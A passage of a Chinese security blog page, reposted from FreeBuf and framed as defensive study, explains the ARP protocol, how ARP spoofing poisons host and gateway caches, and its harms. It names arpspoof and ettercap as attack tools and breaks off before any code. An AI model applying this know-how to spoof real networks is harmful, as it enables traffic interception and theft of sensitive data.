<!DOCTYPE html>
<html lang="zh-CN" data-theme="light">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <meta name="generator" content="VuePress 2.0.0-beta.62" />
    <meta name="theme" content="VuePress Theme Hope" />
    <meta property="og:url" content="https://alanweekend.github.io/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%B5%85%E8%B0%88ARP%E6%AC%BA%E9%AA%97%E7%9A%84%E5%AE%9E%E7%8E%B0%E4%B8%8E%E9%98%B2%E5%BE%A1/"><meta property="og:site_name" content="Gaming & Coding"><meta property="og:title" content="浅谈ARP欺骗的实现与防御"><meta property="og:description" content="freebuf稿件 (https://www.freebuf.com/articles/network/210852.html) 引言 未知攻，焉知防，本文仅研究ARP欺骗攻击防护用！ 什么是ARP协议 官话： 在以太网协议中规定，同一局域网中的一台主机要和另一台主机进行直接通信，必须要知道目标主机的MAC地址。而在TCP/IP协议中，网络层和传输层只..."><meta property="og:type" content="article"><meta property="og:image" content="https://alanweekend.github.io/"><meta property="og:locale" content="zh-CN"><meta property="og:updated_time" content="2023-05-30T07:00:52.000Z"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image:alt" content="浅谈ARP欺骗的实现与防御"><meta property="article:author" content="Weekend"><meta property="article:published_time" content="2022-01-10T10:01:24.000Z"><meta property="article:modified_time" content="2023-05-30T07:00:52.000Z"><script type="application/ld+json">{"@context":"https://schema.org","@type":"Article","headline":"浅谈ARP欺骗的实现与防御","image":["https://alanweekend.github.io/"],"datePublished":"2022-01-10T10:01:24.000Z","dateModified":"2023-05-30T07:00:52.000Z","author":[{"@type":"Person","name":"Weekend","url":"https://alanweekend.github.io/"}]}</script><title>浅谈ARP欺骗的实现与防御 | Gaming & Coding</title><meta name="description" content="freebuf稿件 (https://www.freebuf.com/articles/network/210852.html) 引言 未知攻，焉知防，本文仅研究ARP欺骗攻击防护用！ 什么是ARP协议 官话： 在以太网协议中规定，同一局域网中的一台主机要和另一台主机进行直接通信，必须要知道目标主机的MAC地址。而在TCP/IP协议中，网络层和传输层只...">
    <style>
      :root {
        --bg-color: #fff;
      }

      html[data-theme="dark"] {
        --bg-color: #1d1e1f;
      }

      html,
      body {
        background: var(--bg-color);
      }
    </style>
    <script>
      const userMode = localStorage.getItem("vuepress-theme-hope-scheme");
      const systemDarkMode =
        window.matchMedia &&
        window.matchMedia("(prefers-color-scheme: dark)").matches;

      if (userMode === "dark" || (userMode !== "light" && systemDarkMode)) {
        document.documentElement.setAttribute("data-theme", "dark");
      }
    </script>
    <link rel="preload" href="/assets/style-48e702c3.css" as="style"><link rel="stylesheet" href="/assets/style-48e702c3.css">
    <link rel="modulepreload" href="/assets/app-d50b0428.js"><link rel="modulepreload" href="/assets/index.html-75f92c8a.js"><link rel="modulepreload" href="/assets/index.html-bdc96730.js"><link rel="modulepreload" href="/assets/plugin-vue_export-helper-c27b6911.js"><link rel="prefetch" href="/assets/index.html-1f282a50.js" as="script"><link rel="prefetch" href="/assets/intro.html-86d73a8d.js" as="script"><link rel="prefetch" href="/assets/index.html-7cee6101.js" as="script"><link rel="prefetch" href="/assets/index.html-882a606d.js" as="script"><link rel="prefetch" href="/assets/index.html-23a54943.js" as="script"><link rel="prefetch" href="/assets/index.html-846634e0.js" as="script"><link rel="prefetch" href="/assets/index.html-b3aa1893.js" as="script"><link rel="prefetch" href="/assets/index.html-4199f82c.js" as="script"><link rel="prefetch" href="/assets/index.html-d571f997.js" as="script"><link rel="prefetch" href="/assets/index.html-71431175.js" as="script"><link rel="prefetch" href="/assets/index.html-667df62b.js" as="script"><link rel="prefetch" href="/assets/index.html-b8f2da89.js" as="script"><link rel="prefetch" href="/assets/index.html-8c46a169.js" as="script"><link rel="prefetch" href="/assets/index.html-0c5ca4b8.js" as="script"><link rel="prefetch" href="/assets/404.html-7035c29c.js" as="script"><link rel="prefetch" href="/assets/index.html-12f9da8e.js" as="script"><link rel="prefetch" href="/assets/index.html-0dc75e4b.js" as="script"><link rel="prefetch" href="/assets/index.html-8cdc8061.js" as="script"><link rel="prefetch" href="/assets/index.html-13f05405.js" as="script"><link rel="prefetch" href="/assets/index.html-5ac0824c.js" as="script"><link rel="prefetch" href="/assets/index.html-d66b8f8f.js" as="script"><link rel="prefetch" href="/assets/index.html-be90d6c5.js" as="script"><link rel="prefetch" href="/assets/index.html-f6f39684.js" as="script"><link rel="prefetch" href="/assets/index.html-72ced33e.js" as="script"><link rel="prefetch" href="/assets/index.html-56bda4ad.js" as="script"><link rel="prefetch" href="/assets/index.html-f4324e46.js" as="script"><link rel="prefetch" href="/assets/index.html-a63dee3e.js" as="script"><link rel="prefetch" href="/assets/index.html-1fc1fb5b.js" as="script"><link rel="prefetch" href="/assets/index.html-7322b8ea.js" as="script"><link rel="prefetch" href="/assets/index.html-73481a45.js" as="script"><link rel="prefetch" href="/assets/index.html-77824aae.js" as="script"><link rel="prefetch" href="/assets/index.html-3abe5733.js" as="script"><link rel="prefetch" href="/assets/index.html-2377e31a.js" as="script"><link rel="prefetch" href="/assets/index.html-b61ff1a1.js" as="script"><link rel="prefetch" href="/assets/index.html-9e733237.js" as="script"><link rel="prefetch" href="/assets/index.html-b423b885.js" as="script"><link rel="prefetch" href="/assets/index.html-3436753a.js" as="script"><link rel="prefetch" href="/assets/index.html-35c88cbb.js" as="script"><link rel="prefetch" href="/assets/index.html-29a9a347.js" as="script"><link rel="prefetch" href="/assets/index.html-12405f86.js" as="script"><link rel="prefetch" href="/assets/intro.html-cd0e32c2.js" as="script"><link rel="prefetch" href="/assets/index.html-ce98107d.js" as="script"><link rel="prefetch" href="/assets/index.html-efe70bf3.js" as="script"><link rel="prefetch" href="/assets/index.html-fc2e5f4f.js" as="script"><link rel="prefetch" href="/assets/index.html-e5d11772.js" as="script"><link rel="prefetch" href="/assets/index.html-7852493f.js" as="script"><link rel="prefetch" href="/assets/index.html-e3e3444d.js" as="script"><link rel="prefetch" href="/assets/index.html-7a5de1e9.js" as="script"><link rel="prefetch" href="/assets/index.html-e699da0e.js" as="script"><link rel="prefetch" href="/assets/index.html-45db9153.js" as="script"><link rel="prefetch" href="/assets/index.html-b3ecee8d.js" as="script"><link rel="prefetch" href="/assets/index.html-4b4c64e9.js" as="script"><link rel="prefetch" href="/assets/index.html-8e946086.js" as="script"><link rel="prefetch" href="/assets/404.html-57c4cef7.js" as="script"><link rel="prefetch" href="/assets/index.html-c024a5cb.js" as="script"><link rel="prefetch" href="/assets/index.html-6604779b.js" as="script"><link rel="prefetch" href="/assets/index.html-aae93050.js" as="script"><link rel="prefetch" href="/assets/index.html-13c001fa.js" as="script"><link rel="prefetch" href="/assets/index.html-18a11fce.js" as="script"><link rel="prefetch" href="/assets/index.html-0fa4ded5.js" as="script"><link rel="prefetch" href="/assets/index.html-95c5fd1c.js" as="script"><link rel="prefetch" href="/assets/index.html-dbaef931.js" as="script"><link rel="prefetch" href="/assets/index.html-c29b97ec.js" as="script"><link rel="prefetch" href="/assets/index.html-f70d6b3d.js" as="script"><link rel="prefetch" href="/assets/index.html-9fa51c1b.js" as="script"><link rel="prefetch" href="/assets/index.html-8c02019d.js" as="script"><link rel="prefetch" href="/assets/index.html-c96e7d92.js" as="script"><link rel="prefetch" href="/assets/index.html-701e6370.js" as="script"><link rel="prefetch" href="/assets/index.html-ad0e9ba3.js" as="script"><link rel="prefetch" href="/assets/index.html-ffafd438.js" as="script"><link rel="prefetch" href="/assets/index.html-048f452e.js" as="script"><link rel="prefetch" href="/assets/index.html-aede5bb1.js" as="script"><link rel="prefetch" href="/assets/index.html-19a16c56.js" as="script"><link rel="prefetch" href="/assets/index.html-d7ccf694.js" as="script"><link rel="prefetch" href="/assets/index.html-6413645e.js" as="script"><link rel="prefetch" href="/assets/index.html-73b546bf.js" as="script"><link rel="prefetch" href="/assets/index.html-00f5c48e.js" as="script"><link rel="prefetch" href="/assets/index.html-f9e13c7e.js" as="script"><link rel="prefetch" href="/assets/giscus-52604b1e.js" as="script"><link rel="prefetch" href="/assets/auto-fa8841cf.js" as="script"><link rel="prefetch" href="/assets/index-ae8c1e74.js" as="script"><link rel="prefetch" href="/assets/flowchart-d65a1d8e.js" as="script"><link rel="prefetch" href="/assets/mermaid.core-23b6192c.js" as="script"><link rel="prefetch" href="/assets/highlight.esm-75b11b9d.js" as="script"><link rel="prefetch" href="/assets/markdown.esm-0191f9da.js" as="script"><link rel="prefetch" href="/assets/math.esm-70a288c8.js" as="script"><link rel="prefetch" href="/assets/notes.esm-a106bb2c.js" as="script"><link rel="prefetch" href="/assets/reveal.esm-ec5549c1.js" as="script"><link rel="prefetch" href="/assets/search.esm-7e6792e2.js" as="script"><link rel="prefetch" href="/assets/zoom.esm-b83b91d0.js" as="script"><link rel="prefetch" href="/assets/VuePlayground-58205d66.js" as="script"><link rel="prefetch" href="/assets/photoswipe.esm-2450701e.js" as="script"><link rel="prefetch" href="/assets/SearchResult-c745a3b2.js" as="script">
  </head>
  <body>
    <div id="app"><!--[--><!--[--><!--[--><span tabindex="-1"></span><a href="#main-content" class="vp-skip-link sr-only">跳至主要內容</a><!--]--><div class="theme-container has-toc"><!--[--><header class="vp-navbar" id="navbar"><div class="vp-navbar-start"><button type="button" class="vp-toggle-sidebar-button" title="Toggle Sidebar"><span class="icon"></span></button><!--[--><!----><!--]--><!--[--><a href="/" class="vp-brand"><img class="vp-nav-logo" src="/logo.png" alt="Gaming &amp; Coding"><!----><span class="vp-site-name hide-in-pad">Gaming &amp; Coding</span></a><!--]--><!--[--><!----><!--]--></div><div class="vp-navbar-center"><!--[--><!----><!--]--><!--[--><!----><!--]--><!--[--><!----><!--]--></div><div class="vp-navbar-end"><!--[--><!----><!--]--><!--[--><!----><!----><div class="nav-item hide-in-mobile"><button type="button" id="appearance-switch"><svg xmlns="http://www.w3.org/2000/svg" class="icon auto-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="auto icon" style="display:block;"><path d="M512 992C246.92 992 32 777.08 32 512S246.92 32 512 32s480 214.92 480 480-214.92 480-480 480zm0-840c-198.78 0-360 161.22-360 360 0 198.84 161.22 360 360 360s360-161.16 360-360c0-198.78-161.22-360-360-360zm0 660V212c165.72 0 300 134.34 300 300 0 165.72-134.28 300-300 300z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" class="icon dark-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="dark icon" style="display:none;"><path d="M524.8 938.667h-4.267a439.893 439.893 0 0 1-313.173-134.4 446.293 446.293 0 0 1-11.093-597.334A432.213 432.213 0 0 1 366.933 90.027a42.667 42.667 0 0 1 45.227 9.386 42.667 42.667 0 0 1 10.24 42.667 358.4 358.4 0 0 0 82.773 375.893 361.387 361.387 0 0 0 376.747 82.774 42.667 42.667 0 0 1 54.187 55.04 433.493 433.493 0 0 1-99.84 154.88 438.613 438.613 0 0 1-311.467 128z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" class="icon light-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="light icon" style="display:none;"><path d="M952 552h-80a40 40 0 0 1 0-80h80a40 40 0 0 1 0 80zM801.88 280.08a41 41 0 0 1-57.96-57.96l57.96-58a41.04 41.04 0 0 1 58 58l-58 57.96zM512 752a240 240 0 1 1 0-480 240 240 0 0 1 0 480zm0-560a40 40 0 0 1-40-40V72a40 40 0 0 1 80 0v80a40 40 0 0 1-40 40zm-289.88 88.08-58-57.96a41.04 41.04 0 0 1 58-58l57.96 58a41 41 0 0 1-57.96 57.96zM192 512a40 40 0 0 1-40 40H72a40 40 0 0 1 0-80h80a40 40 0 0 1 40 40zm30.12 231.92a41 41 0 0 1 57.96 57.96l-57.96 58a41.04 41.04 0 0 1-58-58l58-57.96zM512 832a40 40 0 0 1 40 40v80a40 40 0 0 1-80 0v-80a40 40 0 0 1 40-40zm289.88-88.08 58 57.96a41.04 41.04 0 0 1-58 58l-57.96-58a41 41 0 0 1 57.96-57.96z"></path></svg></button></div><!--[--><button type="button" class="search-pro-button" role="search" aria-label="搜索"><svg xmlns="http://www.w3.org/2000/svg" class="icon search-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="search icon"><path d="M192 480a256 256 0 1 1 512 0 256 256 0 0 1-512 0m631.776 362.496-143.2-143.168A318.464 318.464 0 0 0 768 480c0-176.736-143.264-320-320-320S128 303.264 128 480s143.264 320 320 320a318.016 318.016 0 0 0 184.16-58.592l146.336 146.368c12.512 12.48 32.768 12.48 45.28 0 12.48-12.512 12.48-32.768 0-45.28"></path></svg><div class="placeholder">搜索</div><div class="key-hints"><kbd class="key">Ctrl</kbd><kbd class="key">K</kbd></div></button><!--]--><!--]--><!--[--><!----><!--]--><button type="button" class="vp-toggle-navbar-button" aria-label="Toggle Navbar" aria-expanded="false" aria-controls="nav-screen"><span><span class="vp-top"></span><span class="vp-middle"></span><span class="vp-bottom"></span></span></button></div></header><!----><!--]--><!----><div class="toggle-sidebar-wrapper"><span class="arrow start"></span></div><aside class="sidebar" id="sidebar"><!--[--><!----><!--]--><ul class="sidebar-links"><li><!--[--><a href="/" class="nav-link sidebar-link sidebar-page" aria-label="周末的博客"><span class="font-icon icon iconfont icon-home" style=""></span>周末的博客<!----></a><ul class="sidebar-sub-headers"></ul><!--]--></li><li><!--[--><a href="/intro.html" class="nav-link sidebar-link sidebar-page" aria-label="介绍页"><span class="font-icon icon iconfont icon-info" style=""></span>介绍页<!----></a><ul class="sidebar-sub-headers"></ul><!--]--></li><li><!--[--><a href="/slides" class="nav-link sidebar-link sidebar-page" aria-label="/slides"><!---->/slides<!----></a><ul class="sidebar-sub-headers"></ul><!--]--></li></ul><!--[--><!----><!--]--></aside><!--[--><main class="vp-page" id="main-content"><!--[--><!----><!----><nav class="vp-breadcrumb disable"></nav><div class="vp-page-title"><h1><span class="font-icon icon iconfont icon-edit" style=""></span>浅谈ARP欺骗的实现与防御</h1><div class="page-info"><span class="page-author-info" aria-label="作者🖊" data-balloon-pos="down"><svg xmlns="http://www.w3.org/2000/svg" class="icon author-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="author icon"><path d="M649.6 633.6c86.4-48 147.2-144 147.2-249.6 0-160-128-288-288-288s-288 128-288 288c0 108.8 57.6 201.6 147.2 249.6-121.6 48-214.4 153.6-240 288-3.2 9.6 0 19.2 6.4 25.6 3.2 9.6 12.8 12.8 22.4 12.8h704c9.6 0 19.2-3.2 25.6-12.8 6.4-6.4 9.6-16 6.4-25.6-25.6-134.4-121.6-240-243.2-288z"></path></svg><span><a class="page-author-item" href="https://alanweekend.github.io/" target="_blank" rel="noopener noreferrer">Weekend</a></span><span property="author" content="Weekend"></span></span><!----><span class="page-date-info" aria-label="写作日期📅" data-balloon-pos="down"><svg xmlns="http://www.w3.org/2000/svg" class="icon calendar-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="calendar icon"><path d="M716.4 110.137c0-18.753-14.72-33.473-33.472-33.473-18.753 0-33.473 14.72-33.473 33.473v33.473h66.993v-33.473zm-334.87 0c0-18.753-14.72-33.473-33.473-33.473s-33.52 14.72-33.52 33.473v33.473h66.993v-33.473zm468.81 33.52H716.4v100.465c0 18.753-14.72 33.473-33.472 33.473a33.145 33.145 0 01-33.473-33.473V143.657H381.53v100.465c0 18.753-14.72 33.473-33.473 33.473a33.145 33.145 0 01-33.473-33.473V143.657H180.6A134.314 134.314 0 0046.66 277.595v535.756A134.314 134.314 0 00180.6 947.289h669.74a134.36 134.36 0 00133.94-133.938V277.595a134.314 134.314 0 00-133.94-133.938zm33.473 267.877H147.126a33.145 33.145 0 01-33.473-33.473c0-18.752 14.72-33.473 33.473-33.473h736.687c18.752 0 33.472 14.72 33.472 33.473a33.145 33.145 0 01-33.472 33.473z"></path></svg><span><!----></span><meta property="datePublished" content="2022-01-10T10:01:24.000Z"></span><!----><span class="page-reading-time-info" aria-label="阅读时间⌛" data-balloon-pos="down"><svg xmlns="http://www.w3.org/2000/svg" class="icon timer-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="timer icon"><path d="M799.387 122.15c4.402-2.978 7.38-7.897 7.38-13.463v-1.165c0-8.933-7.38-16.312-16.312-16.312H256.33c-8.933 0-16.311 7.38-16.311 16.312v1.165c0 5.825 2.977 10.874 7.637 13.592 4.143 194.44 97.22 354.963 220.201 392.763-122.204 37.542-214.893 196.511-220.2 389.397-4.661 5.049-7.638 11.651-7.638 19.03v5.825h566.49v-5.825c0-7.379-2.849-13.981-7.509-18.9-5.049-193.016-97.867-351.985-220.2-389.527 123.24-37.67 216.446-198.453 220.588-392.892zM531.16 450.445v352.632c117.674 1.553 211.787 40.778 211.787 88.676H304.097c0-48.286 95.149-87.382 213.728-88.676V450.445c-93.077-3.107-167.901-81.297-167.901-177.093 0-8.803 6.99-15.793 15.793-15.793 8.803 0 15.794 6.99 15.794 15.793 0 80.261 63.69 145.635 142.01 145.635s142.011-65.374 142.011-145.635c0-8.803 6.99-15.793 15.794-15.793s15.793 6.99 15.793 15.793c0 95.019-73.789 172.82-165.96 177.093z"></path></svg><span>大约 15 分钟</span><meta property="timeRequired" content="PT15M"></span><span class="page-category-info" aria-label="分类🌈" data-balloon-pos="down"><svg xmlns="http://www.w3.org/2000/svg" class="icon category-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="category icon"><path d="M148.41 106.992h282.176c22.263 0 40.31 18.048 40.31 40.31V429.48c0 22.263-18.047 40.31-40.31 40.31H148.41c-22.263 0-40.311-18.047-40.311-40.31V147.302c0-22.263 18.048-40.31 40.311-40.31zM147.556 553.478H429.73c22.263 0 40.311 18.048 40.311 40.31v282.176c0 22.263-18.048 40.312-40.31 40.312H147.555c-22.263 0-40.311-18.049-40.311-40.312V593.79c0-22.263 18.048-40.311 40.31-40.311zM593.927 106.992h282.176c22.263 0 40.31 18.048 40.31 40.31V429.48c0 22.263-18.047 40.31-40.31 40.31H593.927c-22.263 0-40.311-18.047-40.311-40.31V147.302c0-22.263 18.048-40.31 40.31-40.31zM730.22 920.502H623.926c-40.925 0-74.22-33.388-74.22-74.425V623.992c0-41.038 33.387-74.424 74.425-74.424h222.085c41.038 0 74.424 33.226 74.424 74.067v114.233c0 10.244-8.304 18.548-18.547 18.548s-18.548-8.304-18.548-18.548V623.635c0-20.388-16.746-36.974-37.33-36.974H624.13c-20.585 0-37.331 16.747-37.331 37.33v222.086c0 20.585 16.654 37.331 37.126 37.331H730.22c10.243 0 18.547 8.304 18.547 18.547 0 10.244-8.304 18.547-18.547 18.547z"></path></svg><!--[--><span class="page-category-item category7 clickable" role="navigation">网络安全</span><!--]--><meta property="articleSection" content="网络安全"></span><!----></div><hr></div><div class="toc-place-holder"><aside id="toc"><!--[--><!----><!--]--><div class="toc-header">此页内容<button type="button" class="print-button" title="打印"><svg xmlns="http://www.w3.org/2000/svg" class="icon print-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="print icon"><path d="M819.2 364.8h-44.8V128c0-17.067-14.933-32-32-32H281.6c-17.067 0-32 14.933-32 32v236.8h-44.8C145.067 364.8 96 413.867 96 473.6v192c0 59.733 49.067 108.8 108.8 108.8h44.8V896c0 17.067 14.933 32 32 32h460.8c17.067 0 32-14.933 32-32V774.4h44.8c59.733 0 108.8-49.067 108.8-108.8v-192c0-59.733-49.067-108.8-108.8-108.8zM313.6 160h396.8v204.8H313.6V160zm396.8 704H313.6V620.8h396.8V864zM864 665.6c0 25.6-19.2 44.8-44.8 44.8h-44.8V588.8c0-17.067-14.933-32-32-32H281.6c-17.067 0-32 14.933-32 32v121.6h-44.8c-25.6 0-44.8-19.2-44.8-44.8v-192c0-25.6 19.2-44.8 44.8-44.8h614.4c25.6 0 44.8 19.2 44.8 44.8v192z"></path></svg></button></div><div class="toc-wrapper"><ul class="toc-list"><!--[--><li class="toc-item"><a aria-current="page" href="/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%B5%85%E8%B0%88ARP%E6%AC%BA%E9%AA%97%E7%9A%84%E5%AE%9E%E7%8E%B0%E4%B8%8E%E9%98%B2%E5%BE%A1/#引言" class="router-link-active router-link-exact-active toc-link level2">引言</a></li><!----><!--]--><!--[--><li class="toc-item"><a aria-current="page" href="/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%B5%85%E8%B0%88ARP%E6%AC%BA%E9%AA%97%E7%9A%84%E5%AE%9E%E7%8E%B0%E4%B8%8E%E9%98%B2%E5%BE%A1/#什么是arp协议" class="router-link-active router-link-exact-active toc-link level2">什么是ARP协议</a></li><!----><!--]--><!--[--><li class="toc-item"><a aria-current="page" href="/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%B5%85%E8%B0%88ARP%E6%AC%BA%E9%AA%97%E7%9A%84%E5%AE%9E%E7%8E%B0%E4%B8%8E%E9%98%B2%E5%BE%A1/#arp是如何工作的" class="router-link-active router-link-exact-active toc-link level2">ARP是如何工作的？</a></li><!----><!--]--><!--[--><li class="toc-item"><a aria-current="page" href="/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%B5%85%E8%B0%88ARP%E6%AC%BA%E9%AA%97%E7%9A%84%E5%AE%9E%E7%8E%B0%E4%B8%8E%E9%98%B2%E5%BE%A1/#什么是arp欺骗" class="router-link-active router-link-exact-active toc-link level2">什么是ARP欺骗</a></li><!----><!--]--><!--[--><li class="toc-item"><a aria-current="page" href="/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%B5%85%E8%B0%88ARP%E6%AC%BA%E9%AA%97%E7%9A%84%E5%AE%9E%E7%8E%B0%E4%B8%8E%E9%98%B2%E5%BE%A1/#arp攻击的危害1-造成局域网中的其他主机断网。2-劫持局域网中其他主机或网关的流量-获取敏感信息-甚至引发进一步的dns欺骗等。" class="router-link-active router-link-exact-active toc-link level2">ARP攻击的危害1.造成局域网中的其他主机断网。2.劫持局域网中其他主机或网关的流量，获取敏感信息，甚至引发进一步的DNS欺骗等。</a></li><!----><!--]--><!--[--><li class="toc-item"><a aria-current="page" href="/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%B5%85%E8%B0%88ARP%E6%AC%BA%E9%AA%97%E7%9A%84%E5%AE%9E%E7%8E%B0%E4%B8%8E%E9%98%B2%E5%BE%A1/#如何实现arp攻击" class="router-link-active router-link-exact-active toc-link level2">如何实现ARP攻击</a></li><!----><!--]--><!--[--><li class="toc-item"><a aria-current="page" href="/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%B5%85%E8%B0%88ARP%E6%AC%BA%E9%AA%97%E7%9A%84%E5%AE%9E%E7%8E%B0%E4%B8%8E%E9%98%B2%E5%BE%A1/#正文-如何防御arp欺骗" class="router-link-active router-link-exact-active toc-link level2">正文：如何防御ARP欺骗</a></li><!----><!--]--><!--[--><li class="toc-item"><a aria-current="page" href="/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%B5%85%E8%B0%88ARP%E6%AC%BA%E9%AA%97%E7%9A%84%E5%AE%9E%E7%8E%B0%E4%B8%8E%E9%98%B2%E5%BE%A1/#参考资料" class="router-link-active router-link-exact-active toc-link level2">参考资料</a></li><!----><!--]--></ul><div class="toc-marker" style="top:-1.7rem;"></div></div><!--[--><!----><!--]--></aside></div><!----><div class="theme-hope-content"><p><a href="https://www.freebuf.com/articles/network/210852.html" target="_blank" rel="noopener noreferrer">freebuf稿件<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p><h2 id="引言" tabindex="-1"><a class="header-anchor" href="#引言" aria-hidden="true">#</a> 引言</h2><p>未知攻，焉知防，本文仅研究ARP欺骗攻击防护用！</p><hr><h2 id="什么是arp协议" tabindex="-1"><a class="header-anchor" href="#什么是arp协议" aria-hidden="true">#</a> 什么是ARP协议</h2><p>官话： 在以太网协议中规定，同一局域网中的一台主机要和另一台主机进行直接通信，必须要知道目标主机的MAC地址。而在TCP/IP协议中，网络层和传输层只关心目标主机的IP地址。这就导致在以太网中使用IP协议时，数据链路层的以太网协议接到上层IP协议提供的数据中，只包含目的主机的IP地址。于是需要一种方法，根据目的主机的IP地址，获得其MAC地址。这就是ARP协议要做的事情。所谓地址解析（address resolution）就是主机在发送帧前将目标IP地址转换成目标MAC地址的过程。 -- Extracted from WikiPedia.</p><p><strong>通俗点说，在局域网中通信时使用的是MAC地址，而不是常见的IP地址。所以在局域网的两台主机间通信时，必须要知道对方的MAC地址，这就时ARP协议要做的事：将IP地址转换为MAC地址。</strong></p><p>从以太网帧来看，以太网帧分为：以太网首部、上层数据部分、以太网尾，三部分。在物理层传输的数据都是使用以太网帧来封装起来传输的（通俗的说就是在数据包头加上以太网首部，数据包尾加上以太网尾），而网络传输是分层进行的，也就是物理层只处理物理层的数据，对于以太网帧中的上层数据部分并不关心。在以太网帧中，以太网首部中存放了目的主机的MAC地址和源主机的MAC用于在以太网中传输数据。所以，在以太网通信中，只知道对方的IP地址是不可以通信的，因为IP地址属于第三层（网络层）的地址，对于物理层的以太网帧来说IP地址属于上层数据部分，以太网是无法识别的，所以就要使用ARP协议获取到对方的MAC地址进行通信。</p><figure><img src="/assets/1-e1c0cfe7.png" alt="802.3 以太网帧结构" tabindex="0" loading="lazy"><figcaption>802.3 以太网帧结构</figcaption></figure><hr><h2 id="arp是如何工作的" tabindex="-1"><a class="header-anchor" href="#arp是如何工作的" aria-hidden="true">#</a> ARP是如何工作的？</h2><p>举个栗子：现在有两台处于同一局域网的主机A、B。</p><table><thead><tr><th>主机</th><th>IP地址</th><th>MAC地址</th></tr></thead><tbody><tr><td>A</td><td>192.168.1.1</td><td>0A-11-22-33-44-01</td></tr><tr><td>B</td><td>192.168.1.2</td><td>0A-11-22-33-44-02</td></tr></tbody></table><p>现在主机A要和主机B通信，那么根据上面的介绍可以知道，主机A仅有主机B的IP地址是不可以通信的，还要知道主机B的MAC地址，下面介绍主机A是如何通过ARP协议获取主机B的MAC地址的：</p><p>第1步：根据主机A上的路由表内容，IP确定用于访问主机B的转发IP地址是192.168.1.2。然后A主机在自己的本地ARP缓存中检查主机B的匹配MAC地址。</p><p>第2步：如果主机A在ARP缓存中没有找到映射，它将询问192.168.1.2的硬件地址，从而将ARP请求帧广播到本地网络上的所有主机。源主机A的IP地址和MAC地址都包括在ARP请求中。本地网络上的每台主机都接收到ARP请求并且检查是否与自己的IP地址匹配。如果主机发现请求的IP地址与自己的IP地址不匹配，它将丢弃ARP请求</p><p>第3步：主机B确定ARP请求中的IP地址与自己的IP地址匹配，则将主机A的IP地址和MAC地址映射添加到本地ARP缓存中。</p><p>第4步：主机B将包含其MAC地址的ARP回复消息直接发送回主机A。</p><p>第5步：当主机A收到从主机B发来的ARP回复消息时，会用主机B的IP和MAC地址映射更新ARP缓存。本机缓存是有生存期的，生存期结束后，将再次重复上面的过程。主机B的MAC地址一旦确定，主机A就能向主机B发送IP通信了。</p><p>了解ARP协议的工作原理后可以分析出其存在一个严重的安全问题： 在ARP回复时，发送请求包的主机A并不会验证ARP回复包的真实性，也就是不能判断回复主机A的是不是主机B。由此引出一个局域网攻击方式ARP欺骗。</p><hr><h2 id="什么是arp欺骗" tabindex="-1"><a class="header-anchor" href="#什么是arp欺骗" aria-hidden="true">#</a> 什么是ARP欺骗</h2><p>举个栗子：</p><table><thead><tr><th>主机</th><th>IP</th><th>MAC</th></tr></thead><tbody><tr><td>A</td><td>192.168.1.1</td><td>0A-11-22-33-44-01</td></tr><tr><td>B</td><td>192.168.1.2</td><td>0A-11-22-33-44-02</td></tr><tr><td>C</td><td>192.168.1.3</td><td>0A-11-22-33-44-03</td></tr></tbody></table><p>1.主机A要和主机C通信，主机A发出ARP包询问谁是192.168.1.3?请回复192.168.1.1</p><p>2.这时主机B在疯狂的向主机A回复，我是192.168.1.3，我的地址是0A-11-22-33-44-02</p><p>3.由于ARP协议不会验证回复者的身份，造成主机A错误的将192.168.1.3的MAC映射为0A-11-22-33-44-02。</p><p><strong>ARP欺骗的分类</strong> 1.主机欺骗，如同上面的栗子，主机B欺骗局域网中的主机A。 2.网关欺骗，局域网中的主机欺骗网关，从而获取其他主机的进流量。</p><h2 id="arp攻击的危害1-造成局域网中的其他主机断网。2-劫持局域网中其他主机或网关的流量-获取敏感信息-甚至引发进一步的dns欺骗等。" tabindex="-1"><a class="header-anchor" href="#arp攻击的危害1-造成局域网中的其他主机断网。2-劫持局域网中其他主机或网关的流量-获取敏感信息-甚至引发进一步的dns欺骗等。" aria-hidden="true">#</a> <strong>ARP攻击的危害</strong> 1.造成局域网中的其他主机断网。 2.劫持局域网中其他主机或网关的流量，获取敏感信息，甚至引发进一步的DNS欺骗等。</h2><h2 id="如何实现arp攻击" tabindex="-1"><a class="header-anchor" href="#如何实现arp攻击" aria-hidden="true">#</a> 如何实现ARP攻击</h2><p><strong>找轮子</strong> 例如kali下的arpspoof、ettercap等工具。</p><p><strong>造轮子</strong> 首先介绍下LibPacp： 